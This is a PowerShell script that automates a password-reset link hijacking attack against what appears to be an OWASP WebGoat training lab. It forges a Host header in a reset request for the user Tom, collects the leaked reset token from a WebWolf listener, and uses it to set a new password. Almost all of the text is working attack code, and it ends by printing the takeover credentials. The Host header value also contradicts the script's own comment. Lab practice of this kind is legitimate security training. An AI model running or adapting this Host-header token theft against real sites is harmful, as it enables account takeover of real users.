# Password Reset Link Hijacking - PowerShell Automation
# This script automates the attack using curl-style requests

$webGoatBase = "http://192.168.254.112:8001"
$webWolfBase = "http://192.168.254.112:8002"

Write-Host "======================================================================" -ForegroundColor Cyan
Write-Host "PASSWORD RESET LINK HIJACKING ATTACK" -ForegroundColor Cyan
Write-Host "======================================================================" -ForegroundColor Cyan
Write-Host ""

# Step 1: Request password reset with modified Host header
Write-Host "[Step 1] Requesting password reset for Tom with modified Host header..." -ForegroundColor Yellow
Write-Host "  Target: tom@webgoat-cloud.org" -ForegroundColor Gray
Write-Host "  Modified Host: 192.168.254.112:8002 (WebWolf)" -ForegroundColor Gray
Write-Host ""

try {
    $resetResponse = Invoke-WebRequest -Uri "$webGoatBase/WebGoat/PasswordReset/reset/reset-password" `
        -Method POST `
        -Headers @{
            "Host" = "localhost:9090"
            "Content-Type" = "application/x-www-form-urlencoded"
        } `
        -Body "email=tom@webgoat-cloud.org" `
        -UseBasicParsing
    
    Write-Host "[+] Password reset request sent!" -ForegroundColor Green
    Write-Host "    Status: $($resetResponse.StatusCode)" -ForegroundColor Green
    Write-Host ""
    
    # Parse response
    $responseContent = $resetResponse.Content | ConvertFrom-Json -ErrorAction SilentlyContinue
    if ($responseContent) {
        Write-Host "    Response:" -ForegroundColor Gray
        Write-Host ($responseContent | ConvertTo-Json -Depth 5) -ForegroundColor Gray
        Write-Host ""
    }
    
} catch {
    Write-Host "[-] Error sending reset request: $($_.Exception.Message)" -ForegroundColor Red
    Write-Host ""
}

# Step 2: Wait for Tom to click the link
Write-Host "[Step 2] Waiting for Tom to click the reset link..." -ForegroundColor Yellow
Write-Host "  Tom always clicks links immediately!" -ForegroundColor Gray
Write-Host "  Waiting 3 seconds..." -ForegroundColor Gray
Start-Sleep -Seconds 3
Write-Host ""

# Step 3: Check WebWolf for captured token
Write-Host "[Step 3] Checking WebWolf for captured reset token..." -ForegroundColor Yellow
Write-Host "  WebWolf URL: $webWolfBase/WebWolf/requests" -ForegroundColor Gray
Write-Host ""

try {
    # Try to access WebWolf incoming requests
    $webWolfResponse = Invoke-WebRequest -Uri "$webWolfBase/WebWolf/requests" `
        -Method GET `
        -UseBasicParsing -ErrorAction SilentlyContinue
    
    # Look for token in the response
    if ($webWolfResponse.Content -match 'token=([a-zA-Z0-9\-]+)') {
        $capturedToken = $matches[1]
        Write-Host "[+] TOKEN CAPTURED!" -ForegroundColor Green
        Write-Host "    Token: $capturedToken" -ForegroundColor Green
        Write-Host ""
        
        # Step 4: Reset Tom's password
        Write-Host "[Step 4] Using token to reset Tom's password..." -ForegroundColor Yellow
        
        $newPassword = "MyNewPassword123"
        Write-Host "  New Password: $newPassword" -ForegroundColor Gray
        Write-Host ""
        
        try {
            $resetPasswordResponse = Invoke-WebRequest -Uri "$webGoatBase/WebGoat/PasswordReset/reset/reset-password/$capturedToken" `
                -Method POST `
                -Headers @{
                    "Content-Type" = "application/x-www-form-urlencoded"
                } `
                -Body "newPassword=$newPassword" `
                -UseBasicParsing
            
            Write-Host "[+] Password reset successful!" -ForegroundColor Green
            Write-Host "    Status: $($resetPasswordResponse.StatusCode)" -ForegroundColor Green
            Write-Host ""
            Write-Host "======================================================================" -ForegroundColor Green
            Write-Host "SUCCESS! Tom's password has been changed!" -ForegroundColor Green
            Write-Host "======================================================================" -ForegroundColor Green
            Write-Host ""
            Write-Host "You can now login as Tom:" -ForegroundColor Cyan
            Write-Host "  Username: tom" -ForegroundColor White
            Write-Host "  Password: $newPassword" -ForegroundColor White
            Write-Host ""
            
        } catch {
            Write-Host "[-] Error resetting password: $($_.Exception.Message)" -ForegroundColor Red
            Write-Host ""
        }
        
    } else {
        Write-Host "[-] No token found in WebWolf yet" -ForegroundColor Red
        Write-Host ""
        Write-Host "[Manual Step Required]" -ForegroundColor Yellow
        Write-Host "  1. Open WebWolf: $webWolfBase/WebWolf/requests" -ForegroundColor Gray
        Write-Host "  2. Look for incoming request with 'token=' parameter" -ForegroundColor Gray
        Write-Host "  3. Copy the token value" -ForegroundColor Gray
        Write-Host "  4. Run this command to reset password:" -ForegroundColor Gray
        Write-Host "" -ForegroundColor Gray
        Write-Host "     Invoke-WebRequest -Uri '$webGoatBase/WebGoat/PasswordReset/reset/reset-password/YOUR_TOKEN' ``" -ForegroundColor White
        Write-Host "         -Method POST ``" -ForegroundColor White
        Write-Host "         -Headers @{'Content-Type' = 'application/x-www-form-urlencoded'} ``" -ForegroundColor White
        Write-Host "         -Body 'newPassword=MyNewPassword123'" -ForegroundColor White
        Write-Host ""
    }
    
} catch {
    Write-Host "[-] Could not access WebWolf: $($_.Exception.Message)" -ForegroundColor Red
    Write-Host ""
    Write-Host "[Manual Steps]" -ForegroundColor Yellow
    Write-Host "  1. Open WebWolf manually: $webWolfBase" -ForegroundColor Gray
    Write-Host "  2. Login with your WebGoat credentials" -ForegroundColor Gray
    Write-Host "  3. Go to 'Incoming requests' or 'Requests' section" -ForegroundColor Gray
    Write-Host "  4. Find the request with token parameter" -ForegroundColor Gray
    Write-Host "  5. Use the token to reset password (see above)" -ForegroundColor Gray
    Write-Host ""
}

Write-Host "======================================================================" -ForegroundColor Cyan
Write-Host "Script completed!" -ForegroundColor Cyan
Write-Host "======================================================================" -ForegroundColor Cyan
